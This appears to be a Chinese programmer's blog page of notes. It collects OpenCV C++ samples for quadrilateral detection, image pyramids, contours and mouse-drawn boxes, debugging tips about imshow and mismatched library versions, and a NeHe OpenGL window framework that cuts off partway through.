cv::Point2f center(0,0);

cv::Point2f computeIntersect(cv::Vec4i a, cv::Vec4i b)
{
	int x1 = a[0], y1 = a[1], x2 = a[2], y2 = a[3], x3 = b[0], y3 = b[1], x4 = b[2], y4 = b[3];
	float denom;

	if (float d = ((float)(x1 - x2) * (y3 - y4)) - ((y1 - y2) * (x3 - x4)))
	{
		cv::Point2f pt;
		pt.x = ((x1 * y2 - y1 * x2) * (x3 - x4) - (x1 - x2) * (x3 * y4 - y3 * x4)) / d;
		pt.y = ((x1 * y2 - y1 * x2) * (y3 - y4) - (y1 - y2) * (x3 * y4 - y3 * x4)) / d;
		return pt;
	}
	else
		return cv::Point2f(-1, -1);
}

void sortCorners(std::vector<cv::Point2f>& corners, 
                 cv::Point2f center)
{
	std::vector<cv::Point2f> top, bot;

	for (int i = 0; i < corners.size(); i++)
	{
		if (corners[i].y < center.y)
			top.push_back(corners[i]);
		else
			bot.push_back(corners[i]);
	}
	corners.clear();
	
	if (top.size() == 2 && bot.size() == 2){
		cv::Point2f tl = top[0].x > top[1].x ? top[1] : top[0];
		cv::Point2f tr = top[0].x > top[1].x ? top[0] : top[1];
		cv::Point2f bl = bot[0].x > bot[1].x ? bot[1] : bot[0];
		cv::Point2f br = bot[0].x > bot[1].x ? bot[0] : bot[1];
	
		
		corners.push_back(tl);
		corners.push_back(tr);
		corners.push_back(br);
		corners.push_back(bl);
	}
}

int main()
{
	cv::Mat src = cv::imread("image.jpg");
	if (src.empty())
		return -1;

	cv::Mat bw;
	cv::cvtColor(src, bw, CV_BGR2GRAY);
	cv::blur(bw, bw, cv::Size(3, 3));
	cv::Canny(bw, bw, 100, 100, 3);

	std::vector<cv::Vec4i> lines;
	cv::HoughLinesP(bw, lines, 1, CV_PI/180, 70, 30, 10);

	// Expand the lines
	for (int i = 0; i < lines.size(); i++)
	{
		cv::Vec4i v = lines[i];
		lines[i][0] = 0;
		lines[i][1] = ((float)v[1] - v[3]) / (v[0] - v[2]) * -v[0] + v[1]; 
		lines[i][2] = src.cols; 
		lines[i][3] = ((float)v[1] - v[3]) / (v[0] - v[2]) * (src.cols - v[2]) + v[3];
	}
	
	std::vector<cv::Point2f> corners;
	for (int i = 0; i < lines.size(); i++)
	{
		for (int j = i+1; j < lines.size(); j++)
		{
			cv::Point2f pt = computeIntersect(lines[i], lines[j]);
			if (pt.x >= 0 && pt.y >= 0)
				corners.push_back(pt);
		}
	}

	std::vector<cv::Point2f> approx;
	cv::approxPolyDP(cv::Mat(corners), approx, cv::arcLength(cv::Mat(corners), true) * 0.02, true);

	if (approx.size() != 4)
	{
		std::cout << "The object is not quadrilateral!" << std::endl;
		return -1;
	}
	
	// Get mass center
	for (int i = 0; i < corners.size(); i++)
		center += corners[i];
	center *= (1. / corners.size());

	sortCorners(corners, center);
	if (corners.size() == 0){
		std::cout << "The corners were not sorted correctly!" << std::endl;
		return -1;
	}
	cv::Mat dst = src.clone();

	// Draw lines
	for (int i = 0; i < lines.size(); i++)
	{
		cv::Vec4i v = lines[i];
		cv::line(dst, cv::Point(v[0], v[1]), cv::Point(v[2], v[3]), CV_RGB(0,255,0));
	}

	// Draw corner points
	cv::circle(dst, corners[0], 3, CV_RGB(255,0,0), 2);
	cv::circle(dst, corners[1], 3, CV_RGB(0,255,0), 2);
	cv::circle(dst, corners[2], 3, CV_RGB(0,0,255), 2);
	cv::circle(dst, corners[3], 3, CV_RGB(255,255,255), 2);

	// Draw mass center
	cv::circle(dst, center, 3, CV_RGB(255,255,0), 2);

	cv::Mat quad = cv::Mat::zeros(300, 220, CV_8UC3);

	std::vector<cv::Point2f> quad_pts;
	quad_pts.push_back(cv::Point2f(0, 0));
	quad_pts.push_back(cv::Point2f(quad.cols, 0));
	quad_pts.push_back(cv::Point2f(quad.cols, quad.rows));
	quad_pts.push_back(cv::Point2f(0, quad.rows));

	cv::Mat transmtx = cv::getPerspectiveTransform(corners, quad_pts);
	cv::warpPerspective(src, quad, transmtx, quad.size());

	cv::imshow("image", dst);
	cv::imshow("quadrilateral", quad);
	cv::waitKey();
	return 0;
}




 
 
实现结果：

 
 







 
 
// image_pyramid.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <string>
#include <iostream>
using namespace std;

#include "opencv2/imgproc/imgproc.hpp"
#include "opencv2/highgui/highgui.hpp"
#include <math.h>
#include <stdlib.h>
#include <stdio.h>



#pragma comment(lib,"opencv_core2410d.lib")  
#pragma comment(lib,"opencv_highgui2410d.lib")  
#pragma comment(lib,"opencv_imgproc2410d.lib")  
  

using namespace cv;

/// 全局变量
Mat src, dst, tmp;
char* window_name = "Pyramids Demo";


/**
 * @函数 main
 */
int main( int argc, char** argv )
{
  /// 指示说明
  printf( "\n Zoom In-Out demo  \n " );
  printf( "------------------ \n" );
  printf( " * [u] -> Zoom in  \n" );
  printf( " * [d] -> Zoom out \n" );
  printf( " * [ESC] -> Close program \n \n" );

  /// 测试图像 - 尺寸必须能被 2^{n} 整除
  string image_name;
  cout<<"input image name:"<<endl;
  cin>>image_name;

  src = imread( image_name);
  if( !src.data )
    { printf(" No data! -- Exiting the program \n");
      return -1; }

  tmp = src;
  dst = tmp;

  /// 创建显示窗口
  namedWindow( window_name, CV_WINDOW_AUTOSIZE );
  imshow( window_name, dst );

  /// 循环
  while( true )
  {
    int c;
    c = waitKey(10);

    if( (char)c == 27 )
      { break; }
    if( (char)c == 'u' )
      { pyrUp( tmp, dst, Size( tmp.cols*2, tmp.rows*2 ) );
        printf( "** Zoom In: Image x 2 \n" );
      }
    else if( (char)c == 'd' )
     { pyrDown( tmp, dst, Size( tmp.cols/2, tmp.rows/2 ) );
       printf( "** Zoom Out: Image / 2 \n" );
     }

    imshow( window_name, dst );
    tmp = dst;
  }
  return 0;
}

//缩小，再放大就模糊了，什么情况？

 
 

 







 
 
这个好像是骨头什么的，但是要求轮廓闭合，于是对图片进行一下膨胀操作，再次检测轮廓就好了。
 
// A closed contour.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"


// FindRotation-angle.cpp : 定义控制台应用程序的入口点。
//

// findContours.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"



#include <iostream>
#include <vector>
#include <opencv2/opencv.hpp> 
#include <opencv2/core/core.hpp>
#include <opencv2/imgproc/imgproc.hpp>
#include <opencv2/highgui/highgui.hpp>
//#include "highlight"
//#include "highgui.h"


#pragma comment(lib,"opencv_core2410d.lib")        
#pragma comment(lib,"opencv_highgui2410d.lib")        
#pragma comment(lib,"opencv_imgproc2410d.lib")  

#define PI 3.1415926

using namespace std;
using namespace cv;

int main()
{
	// Read input binary image

	char *image_name = "test.bmp";
	cv::Mat image = cv::imread(image_name);
	if (!image.data)
		return 0; 

	


	
	// 从文件中加载原图  
	  // IplImage *pSrcImage = cvLoadImage(image_name, CV_LOAD_IMAGE_UNCHANGED);  
	  Mat gray(image.size(),CV_8U);
		  
	  cvtColor(image,gray,CV_BGR2GRAY); 
		 // 转为2值图
	 threshold(gray,gray,145,255,cv::THRESH_BINARY_INV);
	//cvThreshold(pSrcImage,pSrcImage,145,255,cv::THRESH_BINARY_INV);
		   
	
	   //image = gray;

	   cv::namedWindow("Binary Image");
	   cv::imshow("Binary Image",gray);



	   cv::Mat element(5,5,CV_8U,cv::Scalar(255));

	   cv::dilate(gray,gray,element);
	   //cv::erode(image,image,element);

	   cv::namedWindow("dilate Image");
	   cv::imshow("dilate Image",gray);


	// Get the contours of the connected components
	std::vector<std::vector<cv::Point>> contours;

	cv::findContours(gray, 
		contours, // a vector of contours 
		CV_RETR_EXTERNAL , // retrieve the external contours
		CV_CHAIN_APPROX_NONE); // retrieve all pixels of each contours

	// Print contours' length
	std::cout << "Contours: " << contours.size() << std::endl;
	std::vector<std::vector<cv::Point>>::const_iterator itContours= contours.begin();
	for ( ; itContours!=contours.end(); ++itContours) 
	{

		std::cout << "Size: " << itContours->size() << std::endl;
	}

	// draw black contours on white image
	cv::Mat result(image.size(),CV_8U,cv::Scalar(255));
	cv::drawContours(result,contours,
		-1, // draw all contours
		cv::Scalar(0), // in black
		2); // with a thickness of 2

	cv::namedWindow("Contours");
	cv::imshow("Contours",result);









	// Eliminate too short or too long contours

	/*
	int cmin= 100;  // minimum contour length
	int cmax= 1000; // maximum contour length
	std::vector<std::vector<cv::Point>>::const_iterator itc= contours.begin();
	while (itc!=contours.end()) {

		if (itc->size() < cmin || itc->size() > cmax)
			itc= contours.erase(itc);
		else 
			++itc;
	}
	
	*/

	// draw contours on the original image
	cv::Mat original= cv::imread(image_name);
	cv::drawContours(original,contours,
		-1, // draw all contours
		cv::Scalar(255,255,0), // in white
		2); // with a thickness of 2

	cv::namedWindow("Contours on Animals");
	cv::imshow("Contours on Animals",original);

	

	// Let's now draw black contours on white image
	result.setTo(cv::Scalar(255));
	cv::drawContours(result,contours,
		-1, // draw all contours
		cv::Scalar(0), // in black
		1); // with a thickness of 1
	image= cv::imread("binary.bmp",0);

	// testing the bounding box 
	


	

	std::vector<std::vector<cv::Point>>::const_iterator itc_rec= contours.begin();
	while (itc_rec!=contours.end())
	{
		cv::Rect r0= cv::boundingRect(cv::Mat(*(itc_rec)));
		cv::rectangle(result,r0,cv::Scalar(0),2);
			++itc_rec;
	}

	/*
	// testing the enclosing circle 
	float radius;
	cv::Point2f center;
	cv::minEnclosingCircle(cv::Mat(contours[1]),center,radius);
	cv::circle(result,cv::Point(center),static_cast<int>(radius),cv::Scalar(0),2);

	//	cv::RotatedRect rrect= cv::fitEllipse(cv::Mat(contours[1]));
	//	cv::ellipse(result,rrect,cv::Scalar(0),2);

	// testing the approximate polygon
	std::vector<cv::Point> poly;
	cv::approxPolyDP(cv::Mat(contours[2]),poly,5,true);

	std::cout << "Polygon size: " << poly.size() << std::endl;

	// Iterate over each segment and draw it
	std::vector<cv::Point>::const_iterator itp= poly.begin();
	while (itp!=(poly.end()-1)) {
		cv::line(result,*itp,*(itp+1),cv::Scalar(0),2);
		++itp;
	}
	// last point linked to first point
	cv::line(result,*(poly.begin()),*(poly.end()-1),cv::Scalar(20),2);

	// testing the convex hull
	std::vector<cv::Point> hull;
	cv::convexHull(cv::Mat(contours[3]),hull);

	// Iterate over each segment and draw it
	std::vector<cv::Point>::const_iterator it= hull.begin();
	while (it!=(hull.end()-1)) {
		cv::line(result,*it,*(it+1),cv::Scalar(0),2);
		++it;
	}
	// last point linked to first point
	cv::line(result,*(hull.begin()),*(hull.end()-1),cv::Scalar(20),2);

	// testing the moments

	// iterate over all contours
	itc= contours.begin();
	while (itc!=contours.end()) {

		// compute all moments
		cv::Moments mom= cv::moments(cv::Mat(*itc++));

		// draw mass center
		cv::circle(result,
			// position of mass center converted to integer
			cv::Point(mom.m10/mom.m00,mom.m01/mom.m00),
			2,cv::Scalar(0),2); // draw black dot
	}

	*/

	cv::namedWindow("Some Shape descriptors");
	cv::imshow("Some Shape descriptors",result);


	cv::waitKey();
	return 0;


}

 
实现效果：
 

 






昨天根据uc伯克利的人工图像分割文件.seg,显示图像的时候调用了OpenCV的库函数，图片都能用imwrite写好，但是imshow死活显示不出来。
今天早上发现原来是imshow()后面应该加上：cvWaitKey(0);











下面两个帖子也是同样的问题：

http://www.cnblogs.com/krisdy/archive/2009/05/26/1429448.html

http://blog.163.com/yuyang_tech/blog/static/2160500832013917111920645/
 
 
 
今天又碰见一个更诡异的问题，cvloadimage()函数能读取图片，但是imread()就不行
IplImage *src;
	src = cvLoadImage("beach.jpg"); //这里将lena.jpg和lena.cpp文件放在同一个文件夹下
	//cvNamedWindow("lena",CV_WINDOW_AUTOSIZE);
	//cvShowImage("lena",src);
	Mat mat(src);
	imshow("who",mat);//这块还是出错

 
 
最后找到了这个帖子：
 
http://bbs.csdn.net/topics/350004415
 
果然是lib库的版本加载错误了，我去，调试了一下午。。。
 
#include <opencv2/core/core.hpp>
#include <opencv2/highgui/highgui.hpp>
#include <opencv2/imgproc/imgproc.hpp>
#include <opencv2/imgproc/imgproc_c.h>
#include <opencv2/calib3d/calib3d.hpp>
#include <opencv2/features2d/features2d.hpp>
#include <opencv2/legacy/legacy.hpp>
using namespace cv;
#pragma comment(lib,"opencv_core2410.lib")
#pragma comment(lib,"opencv_highgui2410.lib")
#pragma comment(lib,"opencv_imgproc2410.lib")
#pragma comment(lib,"opencv_features2d2410.lib")
#pragma comment(lib,"opencv_calib3d2410.lib")
#pragma comment(lib,"opencv_legacy2410.lib")
特别注意上述版本到底是debug还是release版本的
 
debug版本的：后缀都加个d
 
#pragma comment(lib,"opencv_core2410d.lib")
#pragma comment(lib,"opencv_highgui2410d.lib")
#pragma comment(lib,"opencv_imgproc2410d.lib")
#pragma comment(lib,"opencv_features2d2410d.lib")
#pragma comment(lib,"opencv_calib3d2410d.lib")
#pragma comment(lib,"opencv_legacy2410d.lib")
 
 
同样是lib库的版本不对问题，可能造成：
 
1.未经处理的异常
2.ntdll.dll未能加载符号
 

 
﻿﻿






 
 
鼠标画矩形：
 
 
// An example program in which the
// user can draw boxes on the screen.
//
/* License:
   Oct. 3, 2008
   Right to use this code in any way you want without warrenty, support or any guarentee of it working.

   BOOK: It would be nice if you cited it:
   Learning OpenCV: Computer Vision with the OpenCV Library
     by Gary Bradski and Adrian Kaehler
     Published by O'Reilly Media, October 3, 2008
 
   AVAILABLE AT: 
     http://www.amazon.com/Learning-OpenCV-Computer-Vision-Library/dp/0596516134
     Or: http://oreilly.com/catalog/9780596516130/
     ISBN-10: 0596516134 or: ISBN-13: 978-0596516130    

   OTHER OPENCV SITES:
   * The source code is on sourceforge at:
     http://sourceforge.net/projects/opencvlibrary/
   * The OpenCV wiki page (As of Oct 1, 2008 this is down for changing over servers, but should come back):
     http://opencvlibrary.sourceforge.net/
   * An active user group is at:
     http://tech.groups.yahoo.com/group/OpenCV/
   * The minutes of weekly OpenCV development meetings are at:
     http://pr.willowgarage.com/wiki/OpenCV
*/
#include <cv.h>
#include <highgui.h>
#pragma comment(lib,"opencv_core2410d.lib")
#pragma comment(lib,"opencv_highgui2410d.lib")
 
// Define our callback which we will install for
// mouse events.
//
void my_mouse_callback( int event, int x, int y, int flags, void* param );
 
CvRect box;
bool drawing_box = false;
 
// A litte subroutine to draw a box onto an image
//
void draw_box( IplImage* img, CvRect rect )
{
  cvRectangle 
	(
    img, 
    cvPoint(box.x,box.y),
    cvPoint(box.x+box.width,box.y+box.height),
    cvScalar(0xff,0x00,0x00)    /* red */
	);
}
 
int main( int argc, char* argv[] ) 
{
  
  box = cvRect(-1,-1,0,0);

  IplImage* image = cvCreateImage( 
    cvSize(200,200),
    IPL_DEPTH_8U,
    3
  );
  cvZero( image );
  IplImage* temp = cvCloneImage( image );
  
  cvNamedWindow( "Box Example" );
 
  // Here is the crucial moment that we actually install
  // the callback.  Note that we set the value ‘param’ to
  // be the image we are working with so that the callback
  // will have the image to edit.
  //
  cvSetMouseCallback( 
    "Box Example", 
    my_mouse_callback, 
    (void*) image 
  );
 
  // The main program loop.  Here we copy the working image
  // to the ‘temp’ image, and if the user is drawing, then
  // put the currently contemplated box onto that temp image.
  // display the temp image, and wait 15ms for a keystroke,
  // then repeat…
  //
  while( 1 ) {
 
    cvCopyImage( image, temp );
    if( drawing_box ) draw_box( temp, box ); 
    cvShowImage( "Box Example", temp );
 
    if( cvWaitKey( 15 )==27 ) break;
  }
 
  // Be tidy
  //
  cvReleaseImage( &image );
  cvReleaseImage( &temp );
  cvDestroyWindow( "Box Example" );
}
 
// This is our mouse callback.  If the user
// presses the left button, we start a box.
// when the user releases that button, then we
// add the box to the current image.  When the
// mouse is dragged (with the button down) we 
// resize the box.
//
void my_mouse_callback(
   int event, int x, int y, int flags, void* param )
{
 
  IplImage* image = (IplImage*) param;

  switch( event ) {
    case CV_EVENT_MOUSEMOVE: {
      if( drawing_box ) {
        box.width  = x-box.x;
        box.height = y-box.y;
      }
    }
    break;
    case CV_EVENT_LBUTTONDOWN: {
      drawing_box = true;
      box = cvRect( x, y, 0, 0 );
    }
    break;   
    case CV_EVENT_LBUTTONUP: {
      drawing_box = false; 
      if( box.width<0  ) { 
        box.x+=box.width;  
        box.width *=-1; 
      }
      if( box.height<0 ) { 
        box.y+=box.height; 
        box.height*=-1; 
      }
      draw_box( image, box );
    }
    break;   
  }
}


 
 







// setup.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <windows.h>		// Windows的头文件
#include <gl/glew.h>		// 包含最新的gl.h,glu.h库
#include <gl/glut.h>		// 包含OpenGL实用库

#pragma comment(lib, "opengl32.lib") 
#pragma comment(lib, "glu32.lib") 
#pragma comment(lib, "glut32.lib") 


HGLRC           hRC=NULL;							// 窗口着色描述表句柄
HDC             hDC=NULL;							// OpenGL渲染描述表句柄
HWND            hWnd=NULL;							// 保存我们的窗口句柄
HINSTANCE       hInstance;							// 保存程序的实例

bool	keys[256];								// 保存键盘按键的数组
bool	active=TRUE;								// 窗口的活动标志，缺省为TRUE
bool	fullscreen=TRUE;							// 全屏标志缺省，缺省设定成全屏模式

LRESULT	CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);				// WndProc的定义,函数的注册

GLvoid ReSizeGLScene(GLsizei width, GLsizei height)				// 重置OpenGL窗口大小
{
	if (height==0)								// 防止被零除
	{
		height=1;							// 将Height设为1
	}

	glViewport(0, 0, width, height);					// 重置当前的视口

	glMatrixMode(GL_PROJECTION);						// 选择投影矩阵
	glLoadIdentity();							// 重置投影矩阵

	// 设置视口的大小
	gluPerspective(45.0f,(GLfloat)width/(GLfloat)height,0.1f,100.0f);

	glMatrixMode(GL_MODELVIEW);						// 选择模型观察矩阵
	glLoadIdentity();							// 重置模型观察矩阵
}

int InitGL(GLvoid)								// 此处开始对OpenGL进行所有设置
{

	glShadeModel(GL_SMOOTH);						// 启用阴影平滑
	glClearColor(0.0f, 0.0f, 0.0f, 0.0f);					// 黑色背景

	glClearDepth(1.0f);							// 设置深度缓存
	glEnable(GL_DEPTH_TEST);						// 启用深度测试
	glDepthFunc(GL_LEQUAL);							// 所作深度测试的类型

	glHint(GL_PERSPECTIVE_CORRECTION_HINT, GL_NICEST);			// 告诉系统对透视进行修正return TRUE;

	return TRUE;
	// 初始化 OK
}

int DrawGLScene(GLvoid)								// 从这里开始进行所有的绘制
{
	//glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);			// 清除屏幕和深度缓存
	//glLoadIdentity();							// 重置当前的模型观察矩阵

	glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);			// 清除屏幕及深度缓存
	glLoadIdentity();							// 重置当前的模型观察矩阵
	glTranslatef(-1.5f,0.0f,-6.0f);						// 左移 1.5 单位，并移入屏幕 6.0
			
	glTranslatef(3.0f,0.0f,0.0f);						// 右移3单位
		glBegin(GL_QUADS);							//  绘制正方形
		glVertex3f(-1.0f, 1.0f, 0.0f);					// 左上
		glVertex3f( 1.0f, 1.0f, 0.0f);					// 右上
		glVertex3f( 1.0f,-1.0f, 0.0f);					// 左下
		glVertex3f(-1.0f,-1.0f, 0.0f);					// 右下
	glEnd();		




	return TRUE;								//  一切 OK
}

GLvoid KillGLWindow(GLvoid)							// 正常销毁窗口
{

	if (fullscreen)								// 我们处于全屏模式吗?
	{
		ChangeDisplaySettings(NULL,0);					// 是的话，切换回桌面
		ShowCursor(TRUE);						// 显示鼠标指针
	}
	if (hRC)								// 我们拥有OpenGL渲染描述表吗?
	{
		if (!wglMakeCurrent(NULL,NULL))					// 我们能否释放DC和RC描述表?
		{
			MessageBox(NULL,"释放DC或RC失败。","关闭错误",MB_OK | MB_ICONINFORMATION);
		}
		if (!wglDeleteContext(hRC))					// 我们能否删除RC?
		{
			MessageBox(NULL,"释放RC失败。","关闭错误",MB_OK | MB_ICONINFORMATION);
		}
		hRC=NULL;							// 将RC设为 NULL
	}
		if (hDC && !ReleaseDC(hWnd,hDC))					// 我们能否释放 DC?
		{
			MessageBox(NULL,"释放DC失败。","关闭错误",MB_OK | MB_ICONINFORMATION);
			hDC=NULL;							// 将 DC 设为 NULL
		}
		if (hWnd && !DestroyWindow(hWnd))					// 能否销毁窗口?
		{
			MessageBox(NULL,"释放窗口句柄失败。","关闭错误",MB_OK | MB_ICONINFORMATION);
			hWnd=NULL;							// 将 hWnd 设为 NULL
		}
		if (!UnregisterClass("OpenG",hInstance))				// 能否注销类?
		{
		MessageBox(NULL,"不能注销窗口类。","关闭错误",MB_OK | MB_ICONINFORMATION);
		hInstance=NULL;							// 将 hInstance 设为 NULL
		}
}

BOOL CreateGLWindow(char* title, int width, int height, int bits, bool fullscreenflag)
{

	GLuint		PixelFormat;						// 保存查找匹配的结果

   
	WNDCLASS	wc;							// 窗口类结构
	DWORD		dwExStyle;						// 扩展窗口风格
	DWORD		dwStyle;						// 窗口风格
	RECT WindowRect;							// 取得矩形的左上角和右下角的坐标值
	WindowRect.left=(long)0;						// 将Left   设为 0
	WindowRect.right=(long)width;						// 将Right  设为要求的宽度
	WindowRect.top=(long)0;							// 将Top    设为 0
	WindowRect.bottom=(long)height;						// 将Bottom 设为要求的高度
	fullscreen=fullscreenflag;						// 设置全局全屏标志
	hInstance		= GetModuleHandle(NULL);			// 取得我们窗口的实例
	wc.style		= CS_HREDRAW | CS_VREDRAW | CS_OWNDC;		// 移动时重画，并为窗口取得DC
	wc.lpfnWndProc		= (WNDPROC) WndProc;				// WndProc处理消息
	wc.cbClsExtra		= 0;						// 无额外窗口数据
	wc.cbWndExtra		= 0;						// 无额外窗口数据
	wc.hInstance		= hInstance;					// 设置实例
	wc.hIcon		= LoadIcon(NULL, IDI_WINLOGO);			// 装入缺省图标
	wc.hCursor		= LoadCursor(NULL, IDC_ARROW);			// 装入鼠标指针
	wc.hbrBackground	= NULL;						// GL不需要背景
	wc.lpszMenuName		= NULL;						// 不需要菜单
	wc.lpszClassName	= "OpenG";			// 设定类名字

	if (!RegisterClass(&wc))						// 尝试注册窗口类
	{
		MessageBox(NULL,"注册窗口失败","错误",MB_OK|MB_ICONEXCLAMATION);
		return FALSE;							// 退出并返回FALSE
	}

	if (fullscreen)								// 要尝试全屏模式吗?
	{
		DEVMODE dmScreenSettings;						// 设备模式
		memset(&dmScreenSettings,0,sizeof(dmScreenSettings));			// 确保内存清空为零
		dmScreenSettings.dmSize=sizeof(dmScreenSettings);			// Devmode 结构的大小
		dmScreenSettings.dmPelsWidth	= width;				// 所选屏幕宽度
		dmScreenSettings.dmPelsHeight	= height;				// 所选屏幕高度
		dmScreenSettings.dmBitsPerPel	= bits;					// 每象素所选的色彩深度
		dmScreenSettings.dmFields=DM_BITSPERPEL|DM_PELSWIDTH|DM_PELSHEIGHT;
		// 尝试设置显示模式并返回结果。注: CDS_FULLSCREEN 移去了状态条。
		if (ChangeDisplaySettings(&dmScreenSettings,CDS_FULLSCREEN)!=DISP_CHANGE_SUCCESSFUL)
		{
		// 若模式失败，提供两个选项：退出或在窗口内运行。
			if (MessageBox(NULL,"全屏模式在当前显卡上设置失败！\n使用窗口模式？","NeHe G",MB_YESNO|MB_ICONEXCLAMATION)==IDYES)
			{
				fullscreen=FALSE;				// 选择窗口模式(Fullscreen=FALSE)
			}
			else
			{
				// 弹出一个对话框，告诉用户程序结束
				MessageBox(NULL,"程序将被关闭","错误",MB_OK|MB_ICONSTOP);
				return FALSE;					//  退出并返回 FALSE
			}
		}
	}

	if (fullscreen)								// 仍处于全屏模式吗?
	{
		dwExStyle=WS_EX_APPWINDOW;					// 扩展窗体风格
		dwStyle=WS_POPUP;						// 窗体风格
		ShowCursor(FALSE);						// 隐藏鼠标指针
	}
	else
	{
		dwExStyle=WS_EX_APPWINDOW | WS_EX_WINDOWEDGE;			// 扩展窗体风格
		dwStyle=WS_OVERLAPPEDWINDOW;					//  窗体风格
	}

	AdjustWindowRectEx(&WindowRect, dwStyle, FALSE, dwExStyle);		// 调整窗口达到真正要求的大小
	if (!(hWnd=CreateWindowEx(	dwExStyle,				// 扩展窗体风格
					"OpenG",				// 类名字
					title,					// 窗口标题
					WS_CLIPSIBLINGS |			// 必须的窗体风格属性
					WS_CLIPCHILDREN |			// 必须的窗体风格属性
					dwStyle,				// 选择的窗体属性
					0, 0,					// 窗口位置
					WindowRect.right-WindowRect.left,	// 计算调整好的窗口宽度
					WindowRect.bottom-WindowRect.top,	// 计算调整好的窗口高度
					NULL,					// 无父窗口
					NULL,					// 无菜单
					hInstance,				// 实例
					NULL)))					// 不向WM_CREATE传递任何东东

		{
		KillGLWindow();							// 重置显示区
		MessageBox(NULL,"不能创建一个窗口设备描述表","错误",MB_OK|MB_ICONEXCLAMATION);
		return FALSE;							// 返回 FALSE
		}

	static	PIXELFORMATDESCRIPTOR pfd=					// /pfd 告诉窗口我们所希望的东东，即窗口使用的像素格式
	{
		sizeof(PIXELFORMATDESCRIPTOR),					// 上述格式描述符的大小
		1,								// 版本号
		PFD_DRAW_TO_WINDOW |						// 格式支持窗口
		PFD_SUPPORT_OPENGL |						// 格式必须支持OpenGL
		PFD_DOUBLEBUFFER,						// 必须支持双缓冲
		PFD_TYPE_RGBA,							// 申请 RGBA 格式
		bits,								// 选定色彩深度
		0, 0, 0, 0, 0, 0,						// 忽略的色彩位
		0,								// 无Alpha缓存
		0,								// 忽略Shift Bit
		0,								// 无累加缓存
		0, 0, 0, 0,							// 忽略聚集位
		16,								// 16位 Z-缓存 (深度缓存)
		0,								// 无蒙板缓存
		0,								// 无辅助缓存
		PFD_MAIN_PLANE,							// 主绘图层
		0,								// Reserved
		0, 0, 0								// 忽略层遮罩
	};

	if (!(hDC=GetDC(hWnd)))							// 取得设备描述表了么?
	{
		KillGLWindow();							// 重置显示区
		MessageBox(NULL,"不能创建一种相匹配的像素格式","错误",MB_OK|MB_ICONEXCLAMATION);
		return FALSE;							// 返回 FALSE
	}

	if (!(PixelFormat=ChoosePixelFormat(hDC,&pfd)))				// Windows 找到相应的象素格式了吗?
	{
		KillGLWindow();							// 重置显示区
		MessageBox(NULL,"不能设置像素格式","错误",MB_OK|MB_ICONEXCLAMATION);
		return FALSE;							// 返回 FALSE
	}

	if(!SetPixelFormat(hDC,PixelFormat,&pfd))				// 能够设置象素格式么?
	{
		KillGLWindow();							// 重置显示区
		MessageBox(NULL,"不能设置像素格式","错误",MB_OK|MB_ICONEXCLAMATION);
		return FALSE;							// 返回 FALSE
	}

	if (!(hRC=wglCreateContext(hDC)))					// 能否取得着色描述表?
	{
		KillGLWindow();							// 重置显示区
		MessageBox(NULL,"不能创建OpenGL渲染描述表","错误",MB_OK|MB_ICONEXCLAMATION);
		return FALSE;							// 返回 FALSE
	}

	if(!wglMakeCurrent(hDC,hRC))						// 尝试激活着色描述表
	{
		KillGLWindow();							// 重置显示区
		MessageBox(NULL,"不能激活当前的OpenGL渲然描述表","错误",MB_OK|MB_ICONEXCLAMATION);
		return FALSE;							// 返回 FALSE
	}

	ShowWindow(hWnd,SW_SHOW);						// 显示窗口
	SetForegroundWindow(hWnd);						// 略略提高优先级
	SetFocus(hWnd);								// 设置键盘的焦点至此窗口
	ReSizeGLScene(width, height);            // 设置透视 GL 屏幕

	if (!InitGL())								// 初始化新建的GL窗口
	{
		KillGLWindow();							// 重置显示区
		MessageBox(NULL,"Initialization Failed.","ERROR",MB_OK|MB_ICONEXCLAMATION);
		return FALSE;							// 返回 FALSE
	}

	return TRUE;								// 成功
}

LRESULT CALLBACK WndProc(	HWND	hWnd,					// 窗口的句柄
				UINT	uMsg,					// 窗口的消息
				WPARAM	wParam,					// 附加的消息内容
				LPARAM	lParam)					// 附加的消息内容
{

	switch (uMsg)								// 检查Windows消息
	{
		case WM_ACTIVATE:						// 监视窗口激活消息
		{
			if (!HIWORD(wParam))					// 检查最小化状态
			{
				active=TRUE;					// 程序处于激活状态
			}
			else
			{
				active=FALSE;					// 程序不再激活
			}

			return 0;						// 返回消息循环
		}
		case WM_SYSCOMMAND:						// 系统中断命令
		{
			switch (wParam)						// 检查系统调用
			{
				case SC_SCREENSAVE:				// 屏保要运行?
				case SC_MONITORPOWER:				// 显示器要进入节电模式?
				return 0;					// 阻止发生
			}
			break;							// 退出
		}
		case WM_CLOSE:							// 收到Close消息?
		{
			PostQuitMessage(0);					// 发出退出消息
			return 0;						// 返回
		}
		case WM_KEYDOWN:						// 有键按下么?
		{
			keys[wParam] = TRUE;					// 如果是，设为TRUE
			return 0;						// 返回
		}
		case WM_KEYUP:							// 有键放开么?
		{
			keys[wParam] = FALSE;					// 如果是，设为FALSE
			return 0;						// 返回
		}
		case WM_SIZE:							// 调整OpenGL窗口大小
		{
			ReSizeGLScene(LOWORD(lParam),HIWORD(lParam));		// LoWord=Width,HiWord=Height
			return 0;						// 返回
		}
	}
// 向 DefWindowProc传递所有未处理的消息。
	return DefWindowProc(hWnd,uMsg,wParam,lParam);
}

int WINAPI WinMain(	HINSTANCE	hInstance,				// 当前窗口实例
			HINSTANCE	hPrevInstance,				// 前一个窗口实例
			LPSTR		lpCmdLine,				// 命令行参数
			int		nCmdShow)				// 窗口显示状态
{

	MSG	msg;								// Windowsx消息结构
	BOOL	done=FALSE;							// 用来退出循环的Bool 变量
		// 提示用户选择运行模式
	if (MessageBox(NULL,"你想在全屏模式下运行么？", "设置全屏模式",MB_YESNO|MB_ICONQUESTION)==IDNO)
	{
		fullscreen=FALSE;						// FALSE为窗口模式
	}
		// 创建OpenGL窗口
	if (!CreateGLWindow("NeHe's OpenGL程序框架",640,480,16,fullscreen))
	{
		return 0;							// 失败退出
	}
	while(!done)								// 保持循环直到 done=TRUE
	{

 
	if (PeekMessage(&msg,NULL,0,0,PM_REMOVE))			// 有消息在等待吗?
		{
	if (msg.message==WM_QUIT)				// 收到退出消息?
			{
				done=TRUE;					// 是，则done=TRUE
			}
